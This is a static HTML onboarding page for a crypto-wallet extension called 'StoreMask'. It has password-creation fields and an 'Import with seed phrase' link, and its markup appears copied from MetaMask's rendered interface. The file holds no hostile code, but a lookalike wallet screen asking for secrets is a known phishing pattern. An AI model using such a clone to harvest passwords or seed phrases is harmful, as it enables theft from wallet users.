<!doctype html>
<html style="width:357px; height:600px;">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=no">
    <title>StoreMask</title>
    <script src="jquery-3.3.1.min.js"></script>
    <link rel="stylesheet" type="text/css" href="createpassword.css">
    
  </head>
  <body style="width:357px; height:600px;">
    <div class="main-container-wrapper">
      <div class="flex-column flex-grow">
        <div class="first-time-flow">
          <div class="first-view-main-wrapper">
            <div class="first-view-main">
              <form class="create-password">
                <div class="create-password__title">Create Password</div>
                <div class="jss93 jss94 jss96 first-time-flow__input">
                  <label class="jss102 jss87 jss97 jss98 jss101 jss100 jss91" data-shrink="true" for="create-password"><!-- react-text: 83 -->New Password (min 8 chars)<!-- /react-text -->
                  </label>
                  <div class="jss107 jss90 jss114 jss108">
                    <input type="password" aria-invalid="false" aria-required="false" autocomplete="new-password" class="jss115 jss118" id="create-password" value=""></div>
                  </div>
                  <div class="jss93 jss94 jss96 first-time-flow__input">
                    <label class="jss102 jss87 jss97 jss98 jss101 jss100 jss91" data-shrink="true" for="confirm-password"><!-- react-text: 88 -->Confirm Password<!-- /react-text --></label>
                    <div class="jss107 jss90 jss114 jss108">
                      <input type="password" aria-invalid="false" aria-required="false" autocomplete="confirm-password" class="jss115 jss118" id="confirm-password" value="">
                    </div>
                  </div>
                  <button class="first-time-flow__button" disabled="">Create</button>
                  <a href="" class="first-time-flow__link create-password__import-link">Import with seed phrase</a>
                  <div class="breadcrumbs">
                    <div class="breadcrumb" style="background-color: rgb(216, 216, 216);"></div>
                    <div class="breadcrumb" style="background-color: rgb(255, 255, 255);"></div>
                    <div class="breadcrumb" style="background-color: rgb(255, 255, 255);"></div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
  </body>
</html>
